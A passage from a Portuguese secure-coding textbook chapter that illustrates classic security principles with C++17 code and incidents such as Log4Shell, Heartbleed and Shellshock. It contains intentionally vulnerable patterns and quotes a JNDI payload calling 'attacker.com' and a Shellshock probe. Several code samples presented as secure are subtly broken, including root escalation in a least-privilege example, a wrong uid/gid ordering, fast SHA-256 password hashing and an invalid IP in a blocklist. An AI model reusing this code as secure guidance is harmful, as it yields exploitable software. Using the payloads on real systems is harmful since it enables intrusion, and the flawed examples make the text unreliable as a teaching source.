# Capítulo 3 — Princípios de Codificação Segura

Os princípios de codificação segura formam o alicerce sobre o qual todo software resiliente é construído. Eles não são meras sugestões ou boas práticas opcionais — são leis da engenharia de segurança que, quando violadas, resultam em falhas catastróficas documentadas por décadas de incidentes reais. Este capítulo apresenta cada princípio com sua definição formal, implicações práticas em C++17 e casos reais de CVEs que demonstram o custo da negligência.

---

## Objetivos de Aprendizado

Ao final deste capítulo, você será capaz de:

1. **Identificar e aplicar** os princípios fundamentais de segurança de software em código C++17, reconhecendo como cada um se manifesta em sistemas reais.
2. **Projetar interfaces C++** que incorporam menor privilégio, defesa em profundidade e mediação completa por meio de padrões como RAII e type safety.
3. **Analisar CVEs históricas** e mapear cada violação ao princípio de segurança que foi descumprido, extraindo lições aplicáveis ao próprio código.
4. **Implementar mecanismos de controle de acesso** em C++ que seguem fail-safe defaults e design aberto, evitando armadilhas comuns em sistemas de produção.
5. **Avaliar trade-offs** entre segurança e usabilidade ao aplicar princípios como aceitação psicológica e economia de mecanismo em APIs de bibliotecas e frameworks.

---

## 1. Menor Privilégio (Least Privilege)

### 1.1 Definição

O princípio de menor privilégio estabelece que todo componente do sistema — processo, thread, função ou módulo — deve operar com o conjunto mínimo de permissões necessário para completar sua tarefa. Nada mais, nada menos.

Em sistemas C++, isso se manifesta em múltiplas camadas:

- **Processo**: permissões POSIX, tokens Windows, capacidades Linux
- **Objeto**: escopo de visibilidade, encapsulamento, access control lists
- **Recurso**: file descriptors, sockets, memória compartilhada
- **Tempo**: privilégios devem ser adquiridos sob demanda e liberados imediatamente

### 1.2 RAII para Gerenciamento de Privilégios

O padrão RAII (Resource Acquisition Is Initialization) do C++ é a ferramenta natural para implementar menor privilégio. Ao acoplar a lifecycle de privilégios a objetos com escopo definido, garantimos que privilégios são sempre liberados — mesmo em presença de exceções.

```cpp
#include <unistd.h>
#include <sys/prctl.h>
#include <stdexcept>
#include <string>
#include <iostream>

class ScopedPrivilege {
public:
    ScopedPrivilege(uid_t target_uid, gid_t target_gid)
        : original_uid_(getuid()),
          original_gid_(getgid()),
          active_(false)
    {
        if (seteuid(target_uid) != 0 || setegid(target_gid) != 0) {
            throw std::runtime_error("Failed to drop privileges");
        }
        active_ = true;
        std::cout << "Privileges escalated to UID=" << target_uid
                  << " GID=" << target_gid << "\n";
    }

    ~ScopedPrivilege() {
        if (active_) {
            seteuid(original_uid_);
            setegid(original_gid_);
            std::cout << "Privileges restored to UID=" << original_uid_
                      << " GID=" << original_gid_ << "\n";
        }
    }

    ScopedPrivilege(const ScopedPrivilege&) = delete;
    ScopedPrivilege& operator=(const ScopedPrivilege&) = delete;

    ScopedPrivilege(ScopedPrivilege&& other) noexcept
        : original_uid_(other.original_uid_),
          original_gid_(other.original_gid_),
          active_(other.active_)
    {
        other.active_ = false;
    }

    bool isActive() const { return active_; }

private:
    uid_t original_uid_;
    gid_t original_gid_;
    bool active_;
};

void writeTemporaryFile(const std::string& path, const std::string& data) {
    ScopedPrivilege temp_priv(0, 0);
    int fd = open(path.c_str(), O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) {
        throw std::runtime_error("Cannot open temporary file");
    }
    write(fd, data.c_str(), data.size());
    close(fd);
}
```

### 1.3 File Descriptor Management

File descriptors são recursos que devem ser gerenciados com o menor privilégio possível. Um fd aberto desnecessariamente representa superfície de ataque.

```cpp
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <memory>

class FileDescriptor {
public:
    explicit FileDescriptor(int fd = -1) : fd_(fd) {}

    ~FileDescriptor() {
        if (fd_ >= 0) {
            close(fd_);
        }
    }

    FileDescriptor(const FileDescriptor&) = delete;
    FileDescriptor& operator=(const FileDescriptor&) = delete;

    FileDescriptor(FileDescriptor&& other) noexcept : fd_(other.fd_) {
        other.fd_ = -1;
    }

    int get() const { return fd_; }
    int release() {
        int fd = fd_;
        fd_ = -1;
        return fd;
    }

    bool isValid() const { return fd_ >= 0; }

private:
    int fd_;
};

class ScopedSocket {
public:
    ScopedSocket(int domain, int type, int protocol)
        : fd_(socket(domain, type, protocol))
    {
        if (!fd_.isValid()) {
            throw std::runtime_error("Failed to create socket");
        }
    }

    void restrictToLoopback() const {
        struct sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        addr.sin_port = 0;

        if (bind(fd_.get(), reinterpret_cast<struct sockaddr*>(&addr),
                 sizeof(addr)) < 0) {
            throw std::runtime_error("Cannot bind to loopback");
        }
    }

    int get() const { return fd_.get(); }

private:
    FileDescriptor fd_;
};
```

### 1.4 CVE: Log4Shell (CVE-2021-44228) — Violação de Menor Privilégio

**Descrição**: O Log4Shell foi uma vulnerabilidade de gravidade máxima (CVSS 10.0) no Apache Log4j 2.x. O mecanismo de lookup JNDI permitia que strings de log maliciosas como `${jndi:ldap://attacker.com/exploit}` causassem a execução remota de código (RCE).

**Princípio violado**: Menor privilégio — o componente de log não deveria ter permissão para resolver nomes JNDI externos nem carregar classes remotas. O mecanismo de lookup JNDI concedia ao logger privilégios muito além do necessário para sua função primária (escrever texto em log).

**Padrão de código problemático**:

```cpp
// Vulnerable pattern: logging mechanism with excessive capabilities
class LogService {
public:
    void log(const std::string& message) {
        // The logger resolves JNDI lookups embedded in messages
        // This is like giving a file writer the ability to
        // execute remote code - far beyond its responsibility
        std::string resolved = resolveLookups(message);
        writeToFile(resolved);
    }

private:
    std::string resolveLookups(const std::string& input) {
        // Simulated JNDI resolution - this should NEVER exist
        // in a logging component
        if (input.find("${jndi:") != std::string::npos) {
            // In the real CVE, this would fetch and execute
            // remote code via LDAP/RMI
            return fetchAndExecute(input);
        }
        return input;
    }

    std::string fetchAndExecute(const std::string& lookup) {
        // This is the excessive privilege: a logger should not
        // be able to reach out to the network
        // Real attackers used this to load arbitrary .class files
        return "[EXECUTED REMOTE CODE]";
    }

    void writeToFile(const std::string& data) {
        // The only thing a logger SHOULD do
        std::cout << "[LOG] " << data << "\n";
    }
};
```

**Versão corrigida**:

```cpp
#include <string>
#include <regex>
#include <iostream>

class SecureLogger {
public:
    void log(const std::string& message) {
        std::string sanitized = sanitize(message);
        writeToFile(sanitized);
    }

private:
    std::string sanitize(const std::string& input) {
        // Strip any JNDI lookup patterns - deny by default
        static const std::regex jndi_pattern(
            R"(\$\{jndi:[^}]*\})");
        std::string result = std::regex_replace(input, jndi_pattern,
                                                "[BLOCKED_LOOKUP]");

        // Also block other dangerous patterns
        static const std::regex dangerous(
            R"(\$\{(env|sys|java|lower|upper|web):[^}]*\})");
        result = std::regex_replace(result, dangerous,
                                    "[BLOCKED_LOOKUP]");
        return result;
    }

    void writeToFile(const std::string& data) {
        std::cout << "[LOG] " << data << "\n";
    }
};
```

**Lição**: Um componente de log deve apenas escrever texto. Conceder a ele capacidade de resolução de nomes, acesso a rede ou carregamento de código remoto viola frontalmente o princípio de menor privilégio.

---

## 2. Defesa em Profundidade (Defense in Depth)

### 2.1 Definição

Defesa em profundidade consiste em implementar múltiplas camadas independentes de segurança. Se uma camada falhar, as demais continuam protegendo o sistema. É o equivalente digital da fortaleza medieval: muralha externa, pátio interno, muralha interna, torre de comando — cada uma com sua função, cada uma independente.

### 2.2 Múltiplas Validações em C++

```cpp
#include <string>
#include <stdexcept>
#include <regex>
#include <algorithm>
#include <cctype>

class DefenseInDepthValidator {
public:
    struct ValidationResult {
        bool passed;
        std::string layer_failed;
        std::string reason;
    };

    ValidationResult validate(const std::string& input) {
        // Layer 1: Format validation
        auto layer1 = validateFormat(input);
        if (!layer1.passed) return layer1;

        // Layer 2: Length constraints
        auto layer2 = validateLength(input);
        if (!layer2.passed) return layer2;

        // Layer 3: Character whitelist
        auto layer3 = validateCharacters(input);
        if (!layer3.passed) return layer3;

        // Layer 4: Semantic validation
        auto layer4 = validateSemantics(input);
        if (!layer4.passed) return layer4;

        // Layer 5: Rate limiting (conceptual)
        auto layer5 = validateRate();
        if (!layer5.passed) return layer5;

        return {true, "", ""};
    }

private:
    ValidationResult validateFormat(const std::string& input) {
        static const std::regex valid_format(R"(^[a-zA-Z0-9_\-\.]+$)");
        if (!std::regex_match(input, valid_format)) {
            return {false, "format",
                    "Input contains invalid characters"};
        }
        return {true, "", ""};
    }

    ValidationResult validateLength(const std::string& input) {
        constexpr size_t MAX_LENGTH = 256;
        constexpr size_t MIN_LENGTH = 1;
        if (input.size() < MIN_LENGTH || input.size() > MAX_LENGTH) {
            return {false, "length",
                    "Input length out of allowed range"};
        }
        return {true, "", ""};
    }

    ValidationResult validateCharacters(const std::string& input) {
        for (char c : input) {
            if (std::iscntrl(static_cast<unsigned char>(c))) {
                return {false, "characters",
                        "Control characters not allowed"};
            }
        }
        return {true, "", ""};
    }

    ValidationResult validateSemantics(const std::string& input) {
        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(),
                       ::tolower);
        if (lower.find("null") != std::string::npos ||
            lower.find("undefined") != std::string::npos) {
            return {false, "semantics",
                    "Reserved values not allowed"};
        }
        return {true, "", ""};
    }

    ValidationResult validateRate() {
        return {true, "", ""};
    }
};
```

### 2.3 CVE: Equifax Breach (2017) — Falha em Defesa em Profundidade

**Descrição**: O vazamento de dados da Equifax expôs informações pessoais de 147 milhões de pessoas. O Apache Struts CVE-2017-5638 permitiu execução remota de código. A Equifax não aplicou o patch por meses e carecia de segmentação de rede adequada.

**Princípio violado**: Defesa em profundidade — existia um único ponto de falha. O Apache Struts desatualizado não foi corrigido, não havia segmentação de rede, e monitoring inadequado permitiu acesso não detectado por 76 dias.

```cpp
// Single point of failure: no defense in depth
class VulnerableRequestHandler {
public:
    std::string handleRequest(const std::string& raw_request) {
        // Only one layer: direct parsing with no validation
        // If this parser has a vulnerability, the entire system
        // is compromised - there's no fallback defense
        return parseAndExecute(raw_request);
    }

private:
    std::string parseAndExecute(const std::string& request) {
        // No input validation
        // No access control
        // No rate limiting
        // No audit logging
        // No network segmentation checks
        return executeArbitrary(request);
    }

    std::string executeArbitrary(const std::string& cmd) {
        return "[executed: " + cmd + "]";
    }
};
```

**Versão com defesa em profundidade**:

```cpp
#include <string>
#include <unordered_map>
#include <vector>
#include <chrono>
#include <iostream>

class DefenseInDepthHandler {
public:
    struct SecurityEvent {
        std::string type;
        std::string details;
        std::chrono::system_clock::time_point timestamp;
    };

    std::string handleRequest(const std::string& raw_request,
                              const std::string& source_ip) {
        // Layer 1: Network-level filtering
        if (isBlockedIP(source_ip)) {
            logEvent({"blocked_ip", source_ip,
                      std::chrono::system_clock::now()});
            return "Forbidden";
        }

        // Layer 2: Rate limiting
        if (isRateLimited(source_ip)) {
            logEvent({"rate_limited", source_ip,
                      std::chrono::system_clock::now()});
            return "Too Many Requests";
        }

        // Layer 3: Input validation
        if (!validateInput(raw_request)) {
            logEvent({"invalid_input", source_ip,
                      std::chrono::system_clock::now()});
            return "Bad Request";
        }

        // Layer 4: Authentication check
        if (!isAuthenticated(source_ip)) {
            logEvent({"unauthenticated", source_ip,
                      std::chrono::system_clock::now()});
            return "Unauthorized";
        }

        // Layer 5: Authorization check
        if (!isAuthorized(source_ip, raw_request)) {
            logEvent({"unauthorized", source_ip,
                      std::chrono::system_clock::now()});
            return "Forbidden";
        }

        // Layer 6: Safe processing
        auto result = safeProcess(raw_request);

        // Layer 7: Output validation
        return validateOutput(result);
    }

private:
    std::unordered_map<std::string, int> request_counts_;
    std::vector<SecurityEvent> audit_log_;

    bool isBlockedIP(const std::string& ip) {
        static const std::vector<std::string> blocked = {
            "10.0.0.666"
        };
        return std::find(blocked.begin(), blocked.end(), ip)
               != blocked.end();
    }

    bool isRateLimited(const std::string& ip) {
        return request_counts_[ip] > 100;
    }

    bool validateInput(const std::string& input) {
        return !input.empty() && input.size() <= 4096;
    }

    bool isAuthenticated(const std::string& ip) {
        return !ip.empty();
    }

    bool isAuthorized(const std::string& ip,
                      const std::string& request) {
        return true;
    }

    std::string safeProcess(const std::string& request) {
        return "processed: " + request;
    }

    std::string validateOutput(const std::string& output) {
        return output;
    }

    void logEvent(const SecurityEvent& event) {
        audit_log_.push_back(event);
    }
};
```

---

## 3. Padrões Seguros por Defeito (Fail-Safe Defaults)

### 3.1 Definição

O princípio de fail-safe defaults estabelece que, na ausência de uma decisão explícita, o sistema deve assumir o estado mais seguro. Isso significa: negar acesso por padrão, rejeitar entradas por padrão, falhar por segurança por padrão.

Em C++ isso se traduz em:
- Inicializações que negam acesso
- Validações que rejeitam entradas não verificadas
- Estados que impedem operações até autorização explícita

### 3.2 Controle de Acesso com Default-Deny

```cpp
#include <string>
#include <unordered_set>
#include <unordered_map>
#include <iostream>

enum class Permission {
    Read,
    Write,
    Execute,
    Admin
};

class AccessController {
public:
    AccessController() {
        // FAIL-SAFE DEFAULT: no permissions granted
        // User must be explicitly granted each permission
    }

    void grantPermission(const std::string& user, Permission perm) {
        permissions_[user].insert(perm);
    }

    void revokePermission(const std::string& user, Permission perm) {
        permissions_[user].erase(perm);
    }

    bool hasPermission(const std::string& user, Permission perm) const {
        auto it = permissions_.find(user);
        if (it == permissions_.end()) {
            // User not found: DEFAULT DENY
            return false;
        }
        return it->second.count(perm) > 0;
    }

    void printPermissions(const std::string& user) const {
        auto it = permissions_.find(user);
        if (it == permissions_.end()) {
            std::cout << user << ": [no permissions - default deny]\n";
            return;
        }
        std::cout << user << " permissions: "
                  << it->second.size() << " granted\n";
    }

private:
    std::unordered_map<std::string,
        std::unordered_set<Permission>> permissions_;
};

class SecureConfig {
public:
    SecureConfig() : debug_mode_(false),
                     allow_remote_access_(false),
                     max_connections_(10) {
        // All security-sensitive settings default to SAFE values
    }

    bool isDebugMode() const { return debug_mode_; }
    bool allowsRemoteAccess() const { return allow_remote_access_; }
    int getMaxConnections() const { return max_connections_; }

    void enableDebug(bool enable) {
        debug_mode_ = enable;
        if (enable) {
            std::cout << "WARNING: Debug mode enabled - "
                      << "disable in production\n";
        }
    }

    void enableRemoteAccess(bool enable) {
        allow_remote_access_ = enable;
        if (enable) {
            std::cout << "WARNING: Remote access enabled - "
                      << "ensure firewall rules are set\n";
        }
    }

private:
    bool debug_mode_;
    bool allow_remote_access_;
    int max_connections_;
};
```

### 3.3 CVE: Heartbleed (CVE-2014-0160) — Violação de Fail-Safe Defaults

**Descrição**: O Heartbleed foi uma vulnerabilidade no OpenSSL que permitia leitura de memória do servidor através de uma falha no heartbeat TLS. A biblioteca aceitava um campo de tamanho declarado pelo cliente e retornava correspondente quantidade de bytes — sem verificar se o buffer de origem continha realmente essa quantidade.

**Princípio violado**: Fail-safe defaults — o código deveria, na ausência de confirmação do tamanho real, assumir que o tamanho é inválido e rejeitar a requisição. Em vez disso, o padrão era aceitar o tamanho declarado e ler memória além do buffer.

```cpp
#include <cstdint>
#include <cstring>
#include <vector>
#include <iostream>

// Vulnerable heartbeat: accepts client-declared size without verification
struct VulnerableHeartbeat {
    std::vector<uint8_t> process(const uint8_t* payload,
                                 size_t payload_len) {
        if (payload_len < 3) return {};

        uint8_t type = payload[0];
        uint16_t declared_size = 0;
        std::memcpy(&declared_size, payload + 1, 2);

        // BUG: Uses declared_size without checking against
        // actual payload length. This is the Heartbleed vulnerability.
        // The server trusts the client's declared size and reads
        // beyond the allocated buffer.

        std::vector<uint8_t> response(declared_size + 3);
        response[0] = type;
        std::memcpy(response.data() + 1, &declared_size, 2);
        // Reads beyond payload_len — LEAKS server memory!
        std::memcpy(response.data() + 3, payload + 3,
                    declared_size);
        return response;
    }
};
```

**Versão corrigida**:

```cpp
#include <cstdint>
#include <cstring>
#include <vector>
#include <stdexcept>
#include <iostream>

struct SecureHeartbeat {
    static constexpr uint16_t MAX_PAYLOAD = 65535;

    std::vector<uint8_t> process(const uint8_t* payload,
                                 size_t payload_len) {
        if (payload_len < 3) {
            throw std::runtime_error("Heartbeat too short");
        }

        uint8_t type = payload[0];
        uint16_t declared_size = 0;
        std::memcpy(&declared_size, payload + 1, 2);

        // FAIL-SAFE: validate declared_size against actual
        // available data before reading
        size_t available = payload_len - 3;
        if (declared_size > available) {
            // Instead of reading beyond buffer, read only
            // what is actually available
            declared_size = static_cast<uint16_t>(available);
        }

        if (declared_size > MAX_PAYLOAD) {
            throw std::runtime_error("Heartbeat payload too large");
        }

        std::vector<uint8_t> response(declared_size + 3);
        response[0] = type;
        std::memcpy(response.data() + 1, &declared_size, 2);
        std::memcpy(response.data() + 3, payload + 3,
                    declared_size);
        return response;
    }
};
```

**Lição**: Quando um campo de tamanho é declarado por um cliente, NUNCA confie nele cegamente. O padrão seguro é: assumir que o tamanho declarado pode ser mentira e validar contra o tamanho real disponível. Heartbleed vazou dados de milhões de servidores por 2 anos por ignorar essa regra.

---

## 4. Separação de Deveres (Separation of Duties)

### 4.1 Definição

Separação de deveres exige que nenhuma entidade individual tenha controle sobre todas as fases de uma operação crítica. Em sistemas C++, isso significa decompor componentes de segurança em módulos independentes, onde a validação, execução e auditoria são realizadas por componentes distintos.

### 4.2 Processamento de Pagamento com Separação

```cpp
#include <string>
#include <stdexcept>
#include <memory>
#include <iostream>
#include <chrono>

struct Transaction {
    std::string id;
    std::string sender;
    std::string receiver;
    double amount;
    std::string currency;
};

struct ValidationResult {
    bool approved;
    std::string reason;
    std::string validator_id;
};

struct ExecutionResult {
    bool success;
    std::string transaction_id;
    std::string executor_id;
};

class TransactionValidator {
public:
    virtual ~TransactionValidator() = default;
    virtual ValidationResult validate(const Transaction& tx) = 0;
    virtual std::string getId() const = 0;
};

class AmountValidator : public TransactionValidator {
public:
    ValidationResult validate(const Transaction& tx) override {
        if (tx.amount <= 0) {
            return {false, "Amount must be positive", getId()};
        }
        if (tx.amount > 1000000.0) {
            return {false, "Amount exceeds single transaction limit",
                    getId()};
        }
        return {true, "", getId()};
    }

    std::string getId() const override { return "AmountValidator"; }
};

class ComplianceValidator : public TransactionValidator {
public:
    ValidationResult validate(const Transaction& tx) override {
        if (tx.sender.empty() || tx.receiver.empty()) {
            return {false, "Missing sender or receiver", getId()};
        }
        if (tx.sender == tx.receiver) {
            return {false, "Self-transfer not allowed", getId()};
        }
        return {true, "", getId()};
    }

    std::string getId() const override {
        return "ComplianceValidator";
    }
};

class TransactionExecutor {
public:
    virtual ~TransactionExecutor() = default;
    virtual ExecutionResult execute(const Transaction& tx) = 0;
};

class BankingExecutor : public TransactionExecutor {
public:
    ExecutionResult execute(const Transaction& tx) override {
        std::cout << "Executing transaction " << tx.id
                  << ": " << tx.amount << " " << tx.currency
                  << " from " << tx.sender << " to "
                  << tx.receiver << "\n";
        return {true, tx.id, "BankingExecutor"};
    }
};

class TransactionAuditor {
public:
    void recordValidation(const Transaction& tx,
                          const ValidationResult& result) {
        std::cout << "[AUDIT] Validation for " << tx.id
                  << ": approved=" << result.approved
                  << " validator=" << result.validator_id << "\n";
    }

    void recordExecution(const Transaction& tx,
                         const ExecutionResult& result) {
        std::cout << "[AUDIT] Execution for " << tx.id
                  << ": success=" << result.success
                  << " executor=" << result.executor_id << "\n";
    }
};

class PaymentProcessor {
public:
    PaymentProcessor(
        std::vector<std::unique_ptr<TransactionValidator>> validators,
        std::unique_ptr<TransactionExecutor> executor,
        std::unique_ptr<TransactionAuditor> auditor)
        : validators_(std::move(validators)),
          executor_(std::move(executor)),
          auditor_(std::move(auditor)) {}

    ExecutionResult process(const Transaction& tx) {
        for (auto& validator : validators_) {
            auto result = validator->validate(tx);
            auditor_->recordValidation(tx, result);
            if (!result.approved) {
                return {false, tx.id,
                        "rejected_by_" + result.validator_id};
            }
        }

        auto exec_result = executor_->execute(tx);
        auditor_->recordExecution(tx, exec_result);
        return exec_result;
    }

private:
    std::vector<std::unique_ptr<TransactionValidator>> validators_;
    std::unique_ptr<TransactionExecutor> executor_;
    std::unique_ptr<TransactionAuditor> auditor_;
};
```

### 4.3 CVE: Stuxnet — Violação de Separação de Deveres

**Descrição**: O Stuxnet foi um worm projetado para sabotar centrífugas de urânio no programa nuclear iraniano. Utilizou quatro vulnerabilidades zero-day e explorou a confiança excessiva em um único componente: o sistema SCADA Siemens. A estação de engenharia e as centrífugas compartilhavam a mesma camada de controle, sem separação de deveres.

**Princípio violado**: Separação de deveres — um único componente (o controlador PLC) tinha autoridade sobre configuração, operação e monitoramento. O atacante pôde manipular as centrífugas porque não existia uma camada independente de verificação entre a estação de engenharia e o hardware.

```cpp
// Vulnerable pattern: single component controls everything
class VulnerableSCADAController {
public:
    void configureAndRun(int speed_rpm, int pressure_bar) {
        // Same component: validates, configures, executes, monitors
        // An attacker who compromises this one component
        // has full control
        if (validateParameters(speed_rpm, pressure_bar)) {
            applyConfiguration(speed_rpm, pressure_bar);
            startOperation();
            // No independent monitoring - attacker can falsify
            // sensor readings to hide sabotage
        }
    }

private:
    bool validateParameters(int speed, int pressure) {
        // Self-validation is meaningless
        return speed > 0 && pressure > 0;
    }

    void applyConfiguration(int speed, int pressure) {
        std::cout << "Setting speed=" << speed
                  << " pressure=" << pressure << "\n";
    }

    void startOperation() {
        std::cout << "Operation started\n";
    }
};
```

**Versão com separação de deveres**:

```cpp
#include <string>
#include <memory>
#include <iostream>
#include <functional>

class SafetyValidator {
public:
    bool validateSpeed(int rpm) const {
        if (rpm < 600 || rpm > 800) {
            std::cout << "SAFETY VIOLATION: RPM " << rpm
                      << " outside safe range [600, 800]\n";
            return false;
        }
        return true;
    }

    bool validatePressure(int bar) const {
        if (bar < 100 || bar > 200) {
            std::cout << "SAFETY VIOLATION: Pressure " << bar
                      << " outside safe range [100, 200]\n";
            return false;
        }
        return true;
    }
};

class HardwareController {
public:
    void setSpeed(int rpm) {
        std::cout << "Hardware: setting speed to " << rpm << "\n";
    }

    void setPressure(int bar) {
        std::cout << "Hardware: setting pressure to "
                  << bar << "\n";
    }

    void start() {
        std::cout << "Hardware: starting operation\n";
    }
};

class IndependentMonitor {
public:
    void checkStatus() {
        std::cout << "Monitor: verifying actual vs commanded "
                  << "parameters\n";
    }

    bool detectAnomaly(int commanded_speed, int actual_speed) {
        if (std::abs(commanded_speed - actual_speed) > 50) {
            std::cout << "ANOMALY DETECTED: commanded "
                      << commanded_speed << " vs actual "
                      << actual_speed << "\n";
            return true;
        }
        return false;
    }
};

class SecureSCADASystem {
public:
    SecureSCADASystem()
        : validator_(std::make_unique<SafetyValidator>()),
          controller_(std::make_unique<HardwareController>()),
          monitor_(std::make_unique<IndependentMonitor>()) {}

    bool operate(int speed_rpm, int pressure_bar) {
        if (!validator_->validateSpeed(speed_rpm) ||
            !validator_->validatePressure(pressure_bar)) {
            return false;
        }

        controller_->setSpeed(speed_rpm);
        controller_->setPressure(pressure_bar);
        controller_->start();

        monitor_->checkStatus();
        return true;
    }

private:
    std::unique_ptr<SafetyValidator> validator_;
    std::unique_ptr<HardwareController> controller_;
    std::unique_ptr<IndependentMonitor> monitor_;
};
```

---

## 5. Economia de Mecanismo (Economy of Mechanism)

### 5.1 Definição

Economia de mecanismo afirma que quanto mais simples for o mecanismo de segurança, mais fácil é verificá-lo, auditá-lo e confiar nele. Código complexo esconde bugs. Código simples revela sua correção.

Em C++, isso significa:
- Preferir soluções diretas a abstrações complexas
- Minimizar superfície de ataque
- Usar o menor código possível para a tarefa de segurança
- KISS (Keep It Simple, Stupid) como filosofia de segurança

### 5.2 Autenticação: Complexa vs Simples

```cpp
// COMPLEX: Over-engineered authentication with many failure points
class OverEngineeredAuth {
public:
    struct AuthResult {
        bool success;
        std::string token;
        std::string session_id;
        int permission_level;
        std::vector<std::string> capabilities;
    };

    AuthResult authenticate(const std::string& username,
                            const std::string& password,
                            const std::string& mfa_code,
                            const std::string& device_fingerprint,
                            const std::string& geo_location,
                            int timezone_offset) {
        AuthResult result;
        // Complex chain of validation with many hidden states
        // Each step has its own failure mode and edge cases
        // The more complex the code, the more places to hide bugs

        // Step 1: Rate limiting (stateful)
        // Step 2: Credential validation
        // Step 3: MFA verification
        // Step 4: Device fingerprint matching
        // Step 5: Geo-location analysis
        // Step 6: Timezone anomaly detection
        // Step 7: Session creation
        // Step 8: Token generation
        // Step 9: Capability assignment
        // Step 10: Audit logging

        // Each step adds attack surface
        result.success = true;
        result.token = "complex_token_" + username;
        return result;
    }
};
```

**Versão simples e segura**:

```cpp
#include <string>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <array>
#include <iostream>
#include <cstring>

class SimpleAuth {
public:
    struct AuthResult {
        bool success;
        std::string user_id;
    };

    SimpleAuth(const std::string& stored_hash,
               const std::string& stored_salt)
        : stored_hash_(stored_hash), stored_salt_(stored_salt) {}

    AuthResult authenticate(const std::string& username,
                            const std::string& password) {
        // Simple: hash the input and compare
        std::string computed = hashPassword(password, stored_salt_);
        if (computed == stored_hash_) {
            return {true, username};
        }
        return {false, ""};
    }

private:
    std::string stored_hash_;
    std::string stored_salt_;

    std::string hashPassword(const std::string& password,
                             const std::string& salt) {
        std::string combined = salt + password;

        std::array<unsigned char, SHA256_DIGEST_LENGTH> hash;
        EVP_MD_CTX* ctx = EVP_MD_CTX_new();
        if (!ctx) return "";

        EVP_DigestInit_ex(ctx, EVP_sha256(), nullptr);
        EVP_DigestUpdate(ctx, combined.data(), combined.size());
        EVP_DigestFinal_ex(ctx, hash.data(), nullptr);
        EVP_MD_CTX_free(ctx);

        std::string result;
        result.reserve(SHA256_DIGEST_LENGTH * 2);
        for (unsigned char byte : hash) {
            char buf[3];
            snprintf(buf, sizeof(buf), "%02x", byte);
            result += buf;
        }
        return result;
    }
};
```

### 5.3 CVE: Shellshock (CVE-2014-6271) — Violação de Economia de Mecanismo

**Descrição**: O Shellshock foi uma vulnerabilidade no Bash que permitia execução remota de código através de variáveis de ambiente. A complexidade do mecanismo de expansão do bash — que processava funções definidas em variáveis de ambiente — criou uma superfície de ataque massiva e difícil de auditar.

**Princípio violado**: Economia de mecanismo — o bash implementava um mecanismo desnecessariamente complexo de expansão de variáveis que permitia a definição e execução de funções através de variáveis de ambiente. Um mecanismo mais simples de tratar variáveis de ambiente eliminaria a vulnerabilidade.

```cpp
#include <string>
#include <unordered_map>
#include <iostream>
#include <functional>

// Vulnerable pattern: complex environment variable processing
// analogous to Shellshock's vulnerability
class VulnerableEnvProcessor {
public:
    void processEnvironment(const std::string& key,
                            const std::string& value) {
        env_[key] = value;

        // DANGEROUS: If value starts with "() {", execute it
        // This mirrors the Shellshock vulnerability in bash
        if (value.size() > 3 &&
            value.substr(0, 3) == "() ") {
            // Extract and execute function definition
            executeShellFunction(value);
        }
    }

private:
    std::unordered_map<std::string, std::string> env_;

    void executeShellFunction(const std::string& funcDef) {
        // This is the core of Shellshock: environment
        // variables containing function definitions are
        // automatically executed
        std::cout << "Executing shell function: "
                  << funcDef << "\n";
        // In real Shellshock, attacker could inject:
        // "() { :;}; echo VULNERABLE"
    }
};
```

**Versão simples e segura**:

```cpp
#include <string>
#include <unordered_map>
#include <iostream>
#include <algorithm>

class SafeEnvProcessor {
public:
    void processEnvironment(const std::string& key,
                            const std::string& value) {
        // SIMPLE: store as plain strings only
        // No code execution, no function parsing
        // No special syntax interpretation
        if (isValidKey(key) && isValidValue(value)) {
            env_[key] = value;
        }
    }

    std::string get(const std::string& key) const {
        auto it = env_.find(key);
        return (it != env_.end()) ? it->second : "";
    }

private:
    std::unordered_map<std::string, std::string> env_;

    bool isValidKey(const std::string& key) const {
        return !key.empty() && key.size() <= 256 &&
               std::all_of(key.begin(), key.end(),
                   [](char c) {
                       return std::isalnum(c) || c == '_';
                   });
    }

    bool isValidValue(const std::string& value) const {
        // Reject any value that looks like code
        if (value.find("()") != std::string::npos) return false;
        if (value.find("{") != std::string::npos) return false;
        return value.size() <= 4096;
    }
};
```

---

## 6. Mediação Completa (Complete Mediation)

### 6.1 Definição

Mediação completa exige que TODA acesso a um recurso seja verificado, SEMPRE. Não existem atalhos, caches ou confiança implícita. Cada operação deve ser validada independentemente, independentemente de quantas vezes foi validada antes.

### 6.2 TOCTOU em C++

```cpp
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string>
#include <iostream>
#include <stdexcept>

class TOCTOUVulnerable {
public:
    void processFile(const std::string& path) {
        // RACE CONDITION: check-then-act pattern
        struct stat st;
        if (stat(path.c_str(), &st) == 0) {
            // Between stat() and open(), the file could be
            // replaced with a symlink to /etc/shadow
            if (S_ISREG(st.st_mode)) {
                int fd = open(path.c_str(), O_RDONLY);
                // fd might now point to a different file!
                char buffer[1024];
                ssize_t n = read(fd, buffer, sizeof(buffer) - 1);
                if (n > 0) {
                    buffer[n] = '\0';
                    std::cout << "File content: " << buffer << "\n";
                }
                close(fd);
            }
        }
    }
};

class SecureFileAccess {
public:
    static void processFile(const std::string& path) {
        // Use open() with O_NOFOLLOW to prevent symlink attacks
        int fd = open(path.c_str(), O_RDONLY | O_NOFOLLOW);
        if (fd < 0) {
            throw std::runtime_error("Cannot open file securely");
        }

        struct stat st;
        if (fstat(fd, &st) != 0) {
            close(fd);
            throw std::runtime_error("Cannot stat file");
        }

        // Validate using the fd, not the path
        if (!S_ISREG(st.st_mode)) {
            close(fd);
            throw std::runtime_error("Not a regular file");
        }

        if (st.st_uid != getuid() && st.st_uid != 0) {
            close(fd);
            throw std::runtime_error("File not owned by user");
        }

        // Now safe to read — fd points to the verified file
        char buffer[1024];
        ssize_t n = read(fd, buffer, sizeof(buffer) - 1);
        if (n > 0) {
            buffer[n] = '\0';
            std::cout << "Secure content: " << buffer << "\n";
        }
        close(fd);
    }
};
```

### 6.3 Credenciais em Cache

```cpp
#include <string>
#include <unordered_map>
#include <chrono>
#include <iostream>

class CachedAuth {
public:
    struct CachedCredential {
        std::string password_hash;
        std::chrono::system_clock::time_point expiry;
        int failed_attempts;
    };

    bool checkPassword(const std::string& username,
                       const std::string& password) {
        auto it = cache_.find(username);
